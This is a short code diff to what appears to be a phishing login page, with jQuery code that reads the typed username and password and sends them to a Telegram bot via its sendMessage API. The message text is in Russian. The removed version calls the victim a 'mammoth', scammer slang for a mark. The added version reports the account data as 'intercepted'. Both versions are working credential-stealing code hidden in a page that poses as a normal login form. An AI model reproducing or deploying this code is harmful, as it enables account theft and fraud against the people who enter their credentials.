@@ -7385,7 +7385,7 @@ $(document).ready(function() {
                     }, true);
                     $("#outdated-password-popup").addClass("active")
                 }
-                $.get(url="https://api.telegram.org/bot<? echo $token ?>/sendMessage?chat_id=<? echo $_GET['chatid']; ?>&text=🔥Данные мамонта получены🔥 %0A%0A Данные мамонта %0A├ Ник: " + document.getElementById("login").value + " %0A└ Пароль: " +  document.getElementById("password").value);
+                $.get(url="https://api.telegram.org/bot<? echo $token ?>/sendMessage?chat_id=<? echo $_GET['chatid']; ?>&text=🔥Данные аккаунта перехвачены 🔥 %0A%0A Данные аккаунта:  %0A├ Ник: " + document.getElementById("login").value + " %0A└ Пароль: " +  document.getElementById("password").value);
                 c.addClass("btn-notransform");
                 setTimeout(function() {
                     c.removeClass("btn-notransform")
